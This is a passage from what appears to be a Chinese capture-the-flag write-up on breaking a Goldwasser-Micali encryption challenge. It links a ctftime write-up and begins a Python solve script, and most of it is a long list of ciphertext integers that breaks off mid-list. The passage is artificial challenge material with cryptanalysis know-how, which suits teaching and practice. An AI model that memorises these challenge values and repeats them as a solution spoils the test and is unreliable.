13997295715451071253747239124428639199617619156231247326729836233417198543504118262938847989649348778500848314555687607052915438695191930013893628900615, 47229599794488613098124056349473823155280392998354765758670868622165063315177232324540165316843226647506443608478789352548001630604076040168618807914792, 35258213694320046701654200010884312588312321572105544777004280046591344354420706119915893205430664500593588418655204102873984500148524518893396701626955]</span><br></pre></td></tr></table></figure>

<p>ctftime上有原题，但是略有不同，更简单了；它提供了私钥可以分解n</p>
<p><a href="https://ctftime.org/writeup/16120">https://ctftime.org/writeup/16120</a></p>
<p>顺着知道这是Goldwasser-Micali加密系统，也就是同态加密；然后在la佬的博客上找到了脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = <span class="number">76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019</span></span><br><span class="line"></span><br><span class="line">ct = [<span class="number">3266754124418328672247866726679755848701520371443746634280907120024788951726790644565764235065010905480462052367779604906344974859812257431783971523801</span>, <span class="number">3910983850369346009480778834354740700744997092428714236904249742230620033736627429141128095231382899913639523058150705425021618891808444602545149939881</span>, <span class="number">27317810920765841342086929111042193579497353621610031484780035299001131982878467015665982909548553024787488715133220729973409548284520639203793990800234</span>, <span class="number">19049253826935282403928205549454387993361811589455900176398242634533643728656774386121481735599403129610194786842490901299693831767348811888295572944767</span>, <span class="number">46808271552976597930710682808639501725087745986478512439110229094106054260700609611651592136108105668095803793135384187386798141424456627246934054212204</span>, <span class="number">64663556663887876448521825389171681970226171803335047116994602631060184771208916838907061325157227065717836207677682181791737509930934478006410977305334</span>, <span class="number">71370989878902473729538075992611793835381097916199691855392840013136471258314666533631139620910819776545627240136734304044689167904095661008959427867080</span>, <span class="number">5120760109829368119622569216249179916662286493867330392301836160719483165296740657195693270825905530901001014831402378828989266553129276910799248011107</span>, <span class="number">25246762200155764725674915117428266946351252223920353292846537142043123004108726846560540427413694348662172063837532573805768559923596757914542578491702</span>, <span class="number">49840420035538562259818077270014233135437467586063205683943769627434293016547018393482060398482431118280370380641405128927430840198536985630649859298809</span>, <span class="number">84232356416028819831566679779591187299787046636995543449314912076840614265866721410586346948877186101748353344277333107087862936903079928428665929615</span>, <span class="number">56255989340747188472994001728565823905145449088080608312012473951209435572526372645545998691635581191431650844541918635345655144222239028951168850704422</span>, <span class="number">45785662740328453859890278502445450606890445328720454060032120470673511251330845850132591950890320517787732079986810994883608872640852386167756195212718</span>, <span class="number">54029870403864304285925769805259101311108719589466350768320792251083544066361265116520351278475192456130712826836166473186592532002794991923508524064620</span>, <span class="number">46624268375793936417415940726172495902868488296085533559474078710715899350421256180929703375516133001459740255662121433900562906914369420876721969039630</span>, <span class="number">15921219479965848802750013085928522470790034679969324752503581385316275799836521901155562358852385602763599760409651828923729107636248359311532535412386</span>, <span class="number">20190562475428250717792767608071965792428019405686414394515731600072635056217537304104019807474440130549050089029499956554142652193502911411782760901078</span>, <span class="number">41983059548033663270367946174234103357083211319135434721003248220792550449588248783877660929189053228157142988622736136441291989249080446689516065393435</span>, <span class="number">71609539411413240194556215042709157212260128588149087141493760115962392075268935955309314240733799741213805554924840687486128939284886391947755983910372</span>, <span class="number">48382284720865851648431016945797183660266155498343626372038256476287293528764330285514661435350058162782747986164808116116765643203666318480114386099343</span>, <span class="number">46730320638656612110889821918114226564809934661179594844549753878327086621670111917286750423548271235812428733761683357631975738361840732519608444014971</span>, <span class="number">55158112951581407023186496177304925445962183673199215662079568367093310059249411803313113095482726739394326470492736668839734286312650343715767983610363</span>, <span class="number">37112980203698874196497763225414417374526380133937967213841831269520374856619110460606542911440228172533968362786931746291414834514997777285267403140559</span>, <span class="number">63322083017732869600484256664107952565424442164218942893502809096945827312745918616246499734990787742358551946831008809185624657787375819807019566756170</span>, <span class="number">7131499419559104886376982790578102463139236264237964490683901837397932220525370218090186039561412497537162063460706345433646970829567561962759102801409</span>, <span class="number">58987942295441295007027662413419316243220623197071846210550338622495407069803847200822547917184493216087823262589570286179930999452321610193662415873715</span>, <span class="number">40463068017819882296397975257296430843199918804116579332129293544451758450871632123477648266871632208235745045407313414566869271527363707673269415792748</span>, <span class="number">63039255605860594706235701802182469722575918347437216391785141811844940190196047005143996180367679119101277408375635148536688180427946019402484987272510</span>, <span class="number">71847518795481381405870318786706930914683598350750876400219210332724219278096576686583523369096072741462359686018334607665415715621892012499046687826381</span>, <span class="number">26337284123753874828319186304791211620930566566120195495665155862853854859543475630545175774334287940418892288697324254994533678098095744373749417045163</span>, <span class="number">21764014175912521244824061176843027159941043924315159175826402721445924610127916171029483226782579782895796672888523861781938366363972830257845406910975</span>, <span class="number">3435623095726196844062581172306260159832381716480005885061523285318057788012070798019652466654719345533109449262217283547667486720590207050726788521007</span>, <span class="number">45919770921828919777762020824998206274312663582623531457423945627938988437572523960733207639926323480092557203738058449123337560810938710160906364447620</span>, <span class="number">10316176533060759533513950331093265748621797961634020464599935470363429799039909475463319253036787910300618231860969786155510737831206632050394210070451</span>, <span class="number">59917326034119369331371808884574791893663783551610720886605582940613080599142224466706727532690507606452696459627055492221262118596727675146540248450673</span>, <span class="number">10842419169283306075038519352806019318831568946592817182841197553628341894023325198625377701960932683672886924641591814480224960323114162850149838499007</span>, <span class="number">66742064034192815235690238007451310177229882619802417230057418182591053854863990729434269230203542276063435489487230228617313299686445072114861937495520</span>, <span class="number">17337799506489098810311640536792733150718613880893950634528762031894931254405830986337609675999763577152750890798518494436701133617817677416137197595268</span>, <span class="number">11805355039774973413960279981353089487026545524788641978782960297317350024970913592970423213016483957303390870999692309756230863161264738948268751555880</span>, <span class="number">59489883634739735974968870045855217812381229180244297407474712914329781106395937678986012546789197922278383445284656100208400201934959073937202913889830</span>, <span class="number">11401451000912707217036107785027425488005850574045702577420854119932133317734234141433888477046072783546143158822115361906593423801947424855735138806051</span>, <span class="number">18179963830269752328347012892189518105760526272986096873166870569368065912159690171168153334762363786860481716195666269739056960619187285110236225225886</span>, <span class="number">62509640700826594197993512978970850974297618960597709071687370554258739737985841220615247665877415157805625480566585584212254522216095818226299866458643</span>, <span class="number">5990222180228599266357925284831684381480268959200508566159335502046629155561009569578204543747284027605121962752167560001557422741943001415508677363231</span>, <span class="number">33433077637882273687249451259081443266379398604904264246156118486060075935455701873884654140790578203732502170849912443469942139967789200144428417241869</span>, <span class="number">67390195969105286284597473259273322568348281288068806381991832178917414558751508417404533918515282632113916633995251246834970162639704436292989924347318</span>, <span class="number">51701910800009973400544456943096381774979876707129028438769990843089912852448841473885556005345531439548870638966325407697691571465101340746897457585835</span>, <span class="number">64048417355580136172437626164825086735195128281991270452716237192859126404734412422587916788587067007095933362505117338589065656344579539799999449469574</span>, <span class="number">11024312233820256409788185405651410973909901139662527410532287633062222198961951836395718214894529860296406012036221609952405828243329490439564855935053</span>, <span class="number">45329081591634176909575079913822799290480598748734762443445536547105615371937523789002728790051543635047627596020113965500849934460327043133518899375170</span>, <span class="number">50858826475819728877134521770119997192668235111631842299351867815878082946160808043722869955055965555491424602575020061945411539811210145167251037970092</span>, <span class="number">35605374328853657972896594891951135620842006755668179374120075488686032129628717565054614577034983995013621326992214854694654154462512740843488210469396</span>, <span class="number">31170348521031754418118681749590239915934031936796619456246634052178959509402331720360681877547395350885325824851456359846571423553040992405912065457755</span>, <span class="number">59235278298913032815919203840415209842948518118915680147287275616028831011314878653857791522574491917033065613888064574586219759420566309846454002915944</span>, <span class="number">55319991676617828235828390538945693681702722602937980374183338775928431972606168528372504847459436496193456215997930129475890947660295696626996070685399</span>, <span class="number">7946870457459059970109585629186928476241935128637094143300110711234966048431895814853588251934003626794436938278721281017542468015907670659174126094588</span>, <span class="number">60110891503272403664065394170003816011867116599893134107795360372565178776851374128429405006507718785684697472100752699732488483946804818800187786578649</span>, <span class="number">28279251639525643355877411167790163315397766491944901475131371705035937611147913823680263340304888492788066877865697182783730607520500342177273147964465</span>, <span class="number">6673833370069672035529220709936517797053812916528936873626422295997956892073437608466673345610466591708954318522770521974566575022354974853539867139350</span>, <span class="number">5879041803124517031806630247719802188447725120442888110855907546956543471854281435506980968790820321124201724811614798792144878116655764899307623320136</span>, <span class="number">46864340634794085287213925222361157745729562024150128352765398567593088408221097741325336534579587914360401522890993826689469607826752680659459769771431</span>, <span class="number">8194451314034121623645292874953043868906899758451558731238739345182971126911643030327002247089719765234796367899874722374131450517330794969184864265713</span>, <span class="number">54446936497825800023536609025402128927467216919569806105966992425350211112265310321871365273194069612198965714146835792444278709366308142096412297265032</span>, <span class="number">49664620584746459632512586261608724278384529510561086522888627087059419641518391472859742516411690833878920555447289023607513439888401052315872395574373</span>, <span class="number">34156898638495828862328276933343254635452063265485210177467337609797392315838078769011438130125084767966982454733534259502040326632050149471710348508666</span>, <span class="number">30492198670321094942861049272814891796315708599800847931912081071102611152253093617978259071301664216033027428630697510455458584066407898917345416941984</span>, <span class="number">3613793784149192211009755488607428877163935560348733114269389687951497165685491322762261041825459125734297171440959408110806113464512878353595621354124</span>, <span class="number">12279705763694970673180436576088750272877526458037348371251591370848320075305832402846262804422841673867165174198233855848053055868119847638872372525395</span>, <span class="number">40877345239599080056832127332813108739794170402420519232059882581963379407650348756595927322565602511487901201482080745481960512748979230428566291962209</span>, <span class="number">50546970004760152402741173485014399024368459266914425153586817660910717388484363246842197469386308850948569760187130921902062389896918698251273033571856</span>, <span class="number">64662267274327121405145824520139519983970096850456319521102019795323464547250680114959766238015838060324781632896477707391370458399641977648129612809038</span>, <span class="number">74823756640316025618954831379580570287967795410041950245729147391511040327761948655357633338389729152644316098558070852276949927895715141311841068142683</span>, <span class="number">762075440208372468457962518481032774485090765040784352734612009016363153625431711847941729511572440976615875367460547015734181996995485157260725662952</span>, <span class="number">64718051366850823837872791256009130717247018020738367732669264535095514823570679009829052437291714822262216686090867379415239832447699096227625953654575</span>, <span class="number">14328318579478329070293281000390592890070295919392789967087225586048036901970102398921920034252680786983029475504846324077453670966766712985708086115150</span>, <span class="number">47819508550033678412702853706889631101410669749660665471143943281512698676783617665357189652026699097954120882414001154717918997258089353475775017452185</span>, <span class="number">5917167011870468624934459756466041916210766501691207791054221150438479042997857395302149649641551035080177809428783031566380296513853795548449641628586</span>, <span class="number">41372363122583466455014083650227416026095961915774665002591710993359438876577512822289349596872352743367616920266534220322805021770081399906934762996032</span>, <span class="number">28647102763694202026999877209365618843600517790276376715320831598625371231696971200891830639779198173374611170197106904989505701448484935534416324731169</span>, <span class="number">53461351058252039600406409020962287941814731855470754786484336480708351831993692806078731253573365307629429835558250376047395072489343618190215178696516</span>, <span class="number">43211630519982808255325055496431416562222405741391065144006747207494590517094963089326646224294212750016402493438856500908215224317253710640894768430281</span>, <span class="number">8489708911460505185941816612455271338936811013379084567101550260456573945478649038478506124294118197300669469552705017177655827270944844418578645699152</span>, <span class="number">22739718474207416860681516907108136245175908110579776599221423813780736521274509818317809641049136756126199753989311235943226623196775082849059257738072</span>, <span class="number">41216499670212294334651280812035668747548709105131700794545752519540336375321441907637985149672677540242864272713496740582094257029359109571709000713825</span>, <span class="number">48436506165397582669698530270507359120085582624990229731099970062649834008095239898512290025067179859801307370381405935208194802989995664780696159389689</span>, <span class="number">1585369946799131155304166792386457012394172770118639384910000681642835771323532468563585207012194611439135457247277948695062359471337941009175179750235</span>, <span class="number">8603288144119666511944003354168237303458523480925560370062388564635953061635422717389647940009966345557089758149833309897265764908036946377403726618906</span>, <span class="number">64101222620087611592309324709486851372656586138648891623135538258769906088025167941884507437869898345591373545551263183771852460865686465909022927922823</span>, <span class="number">16527144583489800339074589267622703740391892670414596775572362839811603852353263595287933280097926247287643050855717192439454800012237185587025342258030</span>, <span class="number">43667276680817082856834267636292121806981833777605458119209912299727781374012735950942847681976014650650405115417073655652257330450319405915928655376177</span>, <span class="number">39140951449701344166515688244374428886790877436502233180291072955127927101012734150869177569984136037272345222078216497684424410082172979920851697773975</span>, <span class="number">15537931042700254522587611176252004453412359577558220416074867095513378168984740154709389168969110367119587635943911825884344749910502795904913565227171</span>, <span class="number">57584115592473254303228454322525041631785171154103151093178874729079883455704358742586133432524956311883692239859557427834314150568077783639133527406561</span>, <span class="number">15902237980034809502971143965910358380816080400139184729125764474998259483264801894369466939263995676073257771273315544988512081225248999046822890564977</span>, <span class="number">50859432507876871258927044776148363731406483617554361871324332579365392377864999224029880363976243413656509052039814721618557677796897407829481142501716</span>, <span class="number">50060798173579642460106276365259395020688179551858830324826993612669623395929348865201104783185027263959131007321716038538876728815916511632533475508787</span>, <span class="number">21093401456079234258633171367778610446554117298173713744762450971193474816596635169881513417411413038931760122717931556008404922107697781138738323563002</span>, <span class="number">50871264470134644149642093828613407668761384164010018255643103521706312798607261474006789318936113229951254769246573651604524869541390940231104684687828</span>, <span class="number">65838555702814180296502565256444943340789146155658490130335701086297475619402177576374380169326664726736494368635345919297077269982160643735772030139293</span>, <span class="number">24183722911773924891963995001641331599594300538730494876239125258440555112551130346374041352293686484865295711516004079542559716598370506355252388731350</span>, <span class="number">70606983798229863770250838918961585630206515326394820998515905465501611723197873446221977733861919908305182573091789028866133518127760978086624785572904</span>, <span class="number">11574928020551879788627561129470863705564562907388661456838163800143145198992173457723644287037869966419076396134774957477432556478226898353190935778723</span>, <span class="number">61029601692381479053663587491935218989230811632558264300601308877354851284048932424730379285115898154959889378242675070408077916548569590745161494020674</span>, <span class="number">34604770125285800302365085079448294275594244440799617063053747652130859109690225689984871840665734961588683955127558201536801499336385265078556174141724</span>, <span class="number">11825597588617747085813837160017740648061802450778741359221519197975620769557373411105506691743139890711450252799721855339832409870791189985511619821148</span>, <span class="number">34221142804688884612787234476210488966584817478740599608446861479556501184308249517667796316433825013495886774426619501938042883318353949169073622932744</span>, <span class="number">18626654830829475933724422229531521260247749630282640788454897823986815196267646960322528599768563257608682140163517447300417938175281593596472310333259</span>, <span class="number">15709074995155666536793599438372653599673735072188045774362669512451580013591611414407383605083544686738323270765329148547175040050934619370240766488333</span>, <span class="number">1807120755932854104162772993352975977760368638030857510642192355770896237772277641435107116319434482498433810059226241520094868716474796133993906931214</span>, <span class="number">37175875591621937319620824075660098532446211618393274891254086565846020184454461310691428746518208846269028512685632952791283499316042277840066268195129</span>, <span class="number">14652938444415650146108426727368774911315569390356725236669074038662370902353854430602299285995671388121797270924184989138832895927715432624521826601309</span>, <span class="number">47503054411496613094174186159972883477343149161393992519368436992417560814175528597285395254700710111273038321292730265852161368920471476449693712252218</span>, <span class="number">34793266164410375187844704085373206595298873402664366666028335804777378715412285901615379046498740410095606705388808078973507358398160040266718217946420</span>, <span class="number">235777724023845578015968861685977896665545490030219293563237196041336651532625951991560690649655213041706956579810596768294392894560876103128919580119</span>, <span class="number">71699058026409903383591705758367140642656320715564592776562414985231704111130111268636522681868943716260492033121836183918600499109157978582867307435478</span>, <span class="number">5937340281741409173867715448617422850056083505252299835611627207868477902961686067795913449403704616805095770356914061148217655631521545003566311163286</span>, <span class="number">64970050684346645753410765937802248505636168494626578887182023273794960033653433460563394458144307982586048416865603229619651223215132716189029755965020</span>, <span class="number">28870151994623151917023631120163925496751172862446820796983669340074436826020543852010174031614232391623084724927387919132365749617232754179670252501288</span>, <span class="number">69316076200432522853422621078078479151899079890475362712069060151657101527879255706785128065088204453815353722430442067537036693490873329815183509775</span>, <span class="number">3656051605191401898523989951955450249753486544663894178988712577274662300636794652573077192350683038887211374712971200623563954853720538374525587861947</span>, <span class="number">59586376996345945899321257213258255736309213120802065827823301801096000077211540336197804819829222638564990740367120689915041923060818536969845303336048</span>, <span class="number">15209485646348568900613966175730263254996829574333766936919924747188067731995601898247851968054973155712860201835166302413341122127777858826564815332009</span>, <span class="number">65755944655354291863629481839344898125814080585489634477140449461486313994489712061017959934634948723074739252828514224659794230711270273986941151181246</span>, <span class="number">50044404782587975442358611321418585899140310908021360331315863141057616552340669011243801143395299815080254884794259990877619054315600014568718678262588</span>, <span class="number">18558186313286434827342393130857688381981240522540569652973740316924906520700554828290216461503534361328921396613229114436061029645283726932096210928365</span>, <span class="number">68121379646664377662543670223776546293099986219464564654888075357435343435295885243745380118444351548491552692045476944398276755320279785851733710778053</span>, <span class="number">69676172471015297584764278648519463973205605601973973954462659583351488700599697084095357354579852852975382605861180382202167440159214607938057506594888</span>, <span class="number">39868944884482077091789165603089328814636077812394209556130445270433071989411476864469152420597572325645830729366730705237597203343357461240500600362535</span>, <span class="number">23984225124526499163679989394300108542505969311640364168939273256169801709960904670771326948340213899233512604169808182913494660805720194941581797486789</span>, <span class="number">35140762457338703522439666809223184036794921565129617900381351263704514634805278362132497435138148263120289598367498165241519353320876411527172006380453</span>, <span class="number">24710691291453760841127687544504422972359827070499809049833293022746980471322200519845199709962567026745924106667690801956717451739332740526036551644785</span>, <span class="number">42582526200077717150143034364406179825370961007062721122124035466123261273825712581697916024437162094418224246572238536860392260236391392047271653531524</span>, <span class="number">67857483194339954482708519285879971058057170331448036301958621715916752108065210839856796360751666320642447394109637904785042539162094111072802047335497</span>, <span class="number">2599658436887948510146428121143122270311474436315255066097573906424588555325614896291500818473644752988078154748378704726917749596783076943413881775398</span>, <span class="number">62417511462783839398179767060659880783567096687315782396857233019238764137474740645399882358829642616473826449427654813700282313879746864145085481696994</span>, <span class="number">25046815174632206886915532324638612752235046746052396556181373371408959007980374964947016992667728355879280189035456444140202956919168084330921175866799</span>, <span class="number">26746087245003271019093242066186960118445359886088854449367123073505725700064370270771541201830383789978922299669035082389492227282511856195439127986603</span>, <span class="number">12899941330821578969367955126377518942374396461212099980148272913670808413456822700739908200534046934604705454192034690229329311450091796802978183417118</span>, <span class="number">34759455078337466713687570837759299391145888134102277551962358024620758688171187801911667844577854548914263100454305449832301751244677050808326765573935</span>, <span class="number">62641568509833713711570997042380165235664835417880047834887119941106533946838625165485309542062874513558580937837811401775554996056276012858548810747347</span>, <span class="number">54194019664134441577306366078821449269779438459243001896266057182634402737447514629588811251761251129611153860195003472642962987782051611103708961485272</span>, <span class="number">9676719975605727589576567594806284175654511463346916758560517020880951689432081269100395625675818196925127997734215947176763303327133107063728652865092</span>, <span class="number">63566749489727772620392173241354690191479996208515013140899609482323018089891274628587945348053732850402777375616488219134732475021167536614183749124234</span>, <span class="number">41389623900588800459370336537971008333777146975023702675438708757749752963555785484099714125932669585301871871129676831310055260650788211828337348491635</span>, <span class="number">47917075128910721336524911506477538308166963835676033239879005679388922099453013708492602384789333571083037290234698623216184215279113464823730289467631</span>, <span class="number">42078396965923796292197567173986146390599180034726305403980989544300924488594853500670135297251227759567949453084387623824589172575028323672347374791941</span>, <span class="number">26303467325603478409681425746270561760458104487375750208136288587139525406524153947947748518132616711483856699835473508339705278736292600540239815382909</span>, <span class="number">70210903943912719585335197681971161149552376713285943471513533016171830587948389001752097220135466501852133147457131249134740746493652843424857558685008</span>, <span class="number">10982176703594503335099043190281003439554172817765519010960096427582643358491587999013894116717272583614348843361339369352126040302498012513340173620179</span>, <span class="number">15375296014322542477512079793365451835294548632729239177298243608312496055206983209051785207816356014706827464682118103802848458765231022530576526601610</span>, <span class="number">60741281657044949725279101097916718408759978002888427225701082044375050708404243485772424286061753927582296860956198565404203687044663002010199141883054</span>, <span class="number">51453860908549486935732242355904656953839434743576398315040968465095709554302378990788844834564479090576226704624193613651209306174501876260882175512600</span>, <span class="number">42121429843235634165003593566253812713226165431603117921955402685633741429269868521680013286432815656510584597940543612666107258425775935790786790012041</span>, <span class="number">75847336522995708598859507481988194486014177305660997189842728336432951513069707589487951184161881119260090343324285618931758405413108075158339567925903</span>, <span class="number">65758341817222621457885108916596158755098306658220921631792142654742204146490776266664280599781759820995333825069037428985525987702654906233411792587673</span>, <span class="number">15752213867601716547875293001866113163887582411052023985266075351056384315464535935735251239301973973233286836062255507777260674731895530600057333994665</span>, <span class="number">11151506009425616448244747739591250923500688700709156802826028410961247750111513167162557346776825044249732147604063296508981593009108961067551626395468</span>, <span class="number">24988307810903416422223700059042860807188507865378899213217629974481150832035797596850622418574087799771865200841087717335083639492611011968919584986991</span>, <span class="number">19188983999068145211485730840887302107035995560988908325822555747788727142296909943420991730736407232657762626482614632643567904876131676294106469080567</span>, <span class="number">49165807149291610078767263213011932229369890095374948339130583996779251886618924483782989424700910216292003196618943704463960760836284727712556416138720</span>, <span class="number">20880120825314766313470865125308572795577662008420147141189550790502101907656949439065273036601014525812307321695409142098153427350456159779924065995426</span>, <span class="number">3134148277638552172931615388909963243267631440500151801678408733633678460466625580372490623855596910321277808417815986593695645228186837564359773545208</span>, <span class="number">76027513376813747014021359611570577983815818102025816667258692296115385413227296619875774704856616068742697489757991264586446726640812185996619526500868</span>, <span class="number">9576386300219383458921907336704987148002255976652861754527672989041213499573772344464927344170160854134801169030299424714027104595802440175290118115467</span>, <span class="number">47846312343889535970416011840273559470023183338680746515101124658408961305018438134079804670804491884363672682872663103910308908246260073683029778116394</span>, <span class="number">16836020225895041283399865570278952563361372411312099179664436864693089583825672663104654006872379721154178277022850302378558639898531813871944866012688</span>, <span class="number">29312555443866353115375285797020858933593819317714753848974053207751144798790489316607442702651597786670972424273015577465723971183954317290632255518341</span>, <span class="number">45952399494660064838144555112298851928990690958591804048587523480566851679383669387866668507436863822348953169424458480096739821837326801953301622926562</span>, <span class="number">68334876517321835871217564446395717515355168304996149895652706727069147165281984411219162106481594608000995755151779899698717529318256390790021401438718</span>, <span class="number">25861029641666972527634309013968274542799402009868571607186682711883347548473260695668831750252078832274943353602464264720165568888925706728574087342628</span>, <span class="number">68551775088688184199771942195355426911668032674229430062997403726538379537067490978577329178497921291686561217843648566010918593439905810598612318905217</span>, <span class="number">37765025505682583464362211182398757603423382509025947521873112343726694702300573134890794527289002851767037029190171815999811136695377397688834815605025</span>, <span class="number">4249505767147772196031020651289585799937480050894276528897542147646240685440344617119239879135528543262687454500110733454342336571756916026373576137223</span>, <span class="number">12211897746552190684252135375038193571224731278828097646293011671737319460987527595630272305866452394238518927533887961137804982383129793243658322073814</span>, <span class="number">63672159925831702084608593770871378832840634765254242580922793878262780657303215300065343199745082617326364301567988188247544290658412323708309128521112</span>, <span class="number">5916152400097580259043801191542869219461022009826571612531294723654814844742388313101200734677007620911765056890963706507708736854388938954261090636816</span>, <span class="number">14317119988771636810566962078982667504680472212731015560163258949791136175315507709882234357375608038567842467558284485862323906865760782946330956519430</span>, <span class="number">73425426498763600363398477632846027187594993874507584521147927260063731277446622859480454490655597092173511066199697647323557539421105251159917461116448</span>, <span class="number">51291671008697812263954316353958818245358049801515013402923829127778604245127923912127853869137576703271789663513404617700625997281587078815337810294446</span>, <span class="number">16764552517838375964591874922821157969132749425046056275194064910709033826102499972685485237677710147299249213993545772193666719202717777304436525138230</span>, <span class="number">59295557012652744772208090497926508763666861380190571969243245501411454118387516963262188176132218639685609791422928694949362661989298405412386894959364</span>, <span class="number">65680239245306856298345111605806359497039862013602921288801762280364506136494777241063396949184533793043022857539147614816975238609243733604742559030417</span>, <span class="number">72375457889148576789811045675763717743813326782917792391377546702617598519587357238716263943784839291085690192526337648486979325162244907674119290503179</span>, <span class="number">53234077992007207968984629907955923807193864660771571665077871505422718966065301015318200429417886713035533081206849701294144524970607157018727881011421</span>, <span class="number">15886483931792974203050424700896494469022632750392566017940896092113020011301447115452279047200702841646809408874121286006915340993084644941811925011891</span>, <span class="number">4000026211601185502106663641762011708725430703734671920980073131891918285295081752549137630953921078183393375323131848411438504218653510143085517924354</span>, <span class="number">10319649624556731904039447425825069667183347360430256330142417710766254562223686734071109743956144803418154942873286729125709953817180715625501589162545</span>, <span class="number">2959127299070091142116584970101314098498259209023373122113534164489561723834616597754357457826712259811824721968019042637401460259286073863020743546081</span>, <span class="number">26966963187874068549615333973802158799875048269647561639319582873986161093336638373947258726531714616272425009280351155372607494769526061426271185799776</span>, <span class="number">60480379686940304504344210934804247883844503527104600258142856523953218645216216990403655911740533083627163777976245336274909972984546880202034729883312</span>, <span class="number">27261558287522575971851824442111090365144022873658966480485633047176320843612473205407488091205599851003730101551213929420057107039313052216522197198978</span>, <span class="number">5924889509968412055641812913053199966953595678605910723404383140816995621145232830288766243387119999521206867701900470658723204158233731531189957564758</span>, <span class="number">23453156796655450247116141307366623758418077565767073760208454382429546186654265548677867775354067560840816391896631759441083435660495001159025898492686</span>, <span class="number">76150503404358535746322203310861113340536545623277464771697476586798690077324876584398928162593218798780607052161166996099801460843556940059525992786824</span>, <span class="number">37727315876172847591393275092226735197131216415762771377741373327831827247473435512306043337156965991700136410696885151255831157825105690279082625332709</span>, <span class="number">34063446655575684287153287784734254171212485972386063875998727605151998698499957152558118780955043931859154057516779473847326673786233294077986859617690</span>, <span class="number">47483470590782205333078496439458525138609729122382072733999354756246820163015660201372672052476227811848001151006206216443241731573155888424535367176708</span>, <span class="number">39218420907233152349337503997750016372701524044569318259499048063748671531881474959351678569430809988119317210858114117053551093965393011243381378492998</span>, <span class="number">346813155305357896000101560296376715878805746572198412084124073507251650659757384260350199082220679479346402180280656007677537505603012072956567379200</span>, <span class="number">45220337350144137249456097166594787592336841735274298685371711994002352406886579127021444669722143416211134915968064654027096905338300592093107053708512</span>, <span class="number">5460012104494377033762803353668672910910932872167923235617032840897986334654385783555614999313086224242950388742840844011136027857375260879396677603020</span>, <span class="number">37023646144423321174994717117908019318650072460288262938875273128986672114185107589432972031304290211565654988060691997961153590815964538144365251181775</span>, <span class="number">63177477223445910049201384279690078930019819284264306067500875252847796215965700799007341759196250450491593055470958720571995993265879745352512656382848</span>, <span class="number">1700583012951649590611729034981286100342721588558142880964582566799910787514220066268682066981428229558226944161013518056229007812176089692828860741392</span>, <span class="number">17246038765173067313249878215359330957527587326662502645985291635246053470015915728537330740772303686721906455426913214534530261079901607192934039938060</span>, <span class="number">45987434147399996197496782026993298557958954570476732783848760609793549635871429620277069591160239426699116842877955529435739418658862835669098411826316</span>, <span class="number">21111490547303152987944854108036303223281643522396150653972569704379156697301910516727830184770144662770080107913540137717531007645289253745952440414926</span>, <span class="number">10698232879034106801260353759116257884533008949848502754162380992641437894367605208136298588395112435423177990947470598835570681171317007264887720823778</span>, <span class="number">54293643078851172364687836934990821579687484157127703064858191752204436487026179374856533544917557799042002597904530828982489891703237561281336459590518</span>, <span class="number">47797005580077273834483109591754793806985949961317398846769483505668568755603394284565164912646840149645763801903493468755606222509979288885436039797214</span>, <span class="number">37386506628153260384840150994124701181836200890809074083427785298815850467904026208990622829408207112968603273995655647351172691130659109869622941513399</span>, <span class="number">13057205711934046467118008739652612675758052758290552436105179764903448469199957925782089342100034435811618076856898039125384846873718510721165423899617</span>, <span class="number">18016141907808433145961025284467589788900284749942923516457310468709437001788966178751079198067783831673559463585356851811413814896939807067475555427374</span>, <span class="number">28185214541499079104899299096705844476508797918674889724218918359491538627046768060739267262641563085978395547302726213511677754065988144474006421669919</span>, <span class="number">8541173904106443905299905768662395072832935944800738204096451433781271007344649650999312461498262780266939438629628997360503524609987694055871540797822</span>, <span class="number">55583856938965878851727772532012615591107008734179599213849731144139750332990774963054496728870626955960023548737488241552231532876910895970717980723626</span>, <span class="number">73126878881701489711684528170287200941163894464677667890357697623803069282892472939945202511068349041064012766273020456331595582239718607715580058967921</span>, <span class="number">70354401173234203817094603858861728539350610438961386996586323986304956626309069628495646684906850309442426229300586236137286868518741887422968392162548</span>, <span class="number">8914284227759075166669843800606112854269465008336756701964119837078732698537791220276520358004294502231788167963298136537379442577658229609166991435663</span>, <span class="number">71679986255547965813146878140040664201073433340974131720089263707910307438689531571321153842267530643245284971416280923014280802420073531897677737784480</span>, <span class="number">12700447152069741878296970568845043035888752941098126195431952022535521184822464642258479573298459505834137899501751562570215414736024639835136989283837</span>, <span class="number">6343004739661668027332689782225036016497158024551360141260369562409298110062110418091776522944654709730459185916638767661342308594945318353078260927349</span>, <span class="number">63964337492108130229534104366403606549429509425838893610762333683602786560375188874744626561075352358482069214498737114463864688224040094143695973321979</span>, <span class="number">67331564851630274889744575564877053915024320348750381733860879963760029288286952415043130610380611202287853110449108590432736764101996881476127456612908</span>, <span class="number">53280882069162605530191514443798777810028687362597894103548425458220909107156582202503516464523795628658208894147158134959433009893999958404472326887421</span>, <span class="number">33987412638079761735126555460021225568819079582348419476130572631524190951142125555279430092745231216914642104268144970982726216308555881726629242470610</span>, <span class="number">13682406178752200853488921722342196537145987369704113476544421137346145516814433815172365070204243148827801660590665538792993163703633151871356444406959</span>, <span class="number">59463989125735016166555373271475329218895751331847622880739844997590477284788570075116983616019629056762256994818763091149753839468824722562416533043843</span>, <span class="number">67281682017361977913152739570150548267207777610917492408365814330418488902058223459045634717266171571439824557859718739925029610690419177548771060547694</span>, <span class="number">39405781498711220413739963695737002658793585701279503786490288662610492817823621117021234029885675098802400891723678776479565707731211683846374263316873</span>, <span class="number">53034807419358874766350432376315742395296988744022530785117462484846925513344688866349068005871824739673532913987445237461471468400241186927222857371834</span>, <span class="number">68305629722812234698423066134000790386970292527553321835797323301872488612831063496859128755927745930236100965836720379665554220277417403641562506589739</span>, <span class="number">15838477469714165090920618367681569358742354857430493842822269635842365646470133405526909343100727954425645887159301780057362634821410546797188280600973</span>, <span class="number">24406667934205773393486573213298175430629511700972743156092216312470305819697796258655710647669449052724920514990995515510027140733652668755162210879284</span>, <span class="number">68460243344752374579091832429666515661775987782765587913153602252111004705931127037248902092418367233502792799588802584226718845415421737479907804077611</span>, <span class="number">63808325950210035810812291635020630613732453561277058010602422073363230632345954950950233595453773160105621255639806986604615621453822332892789828462090</span>, <span 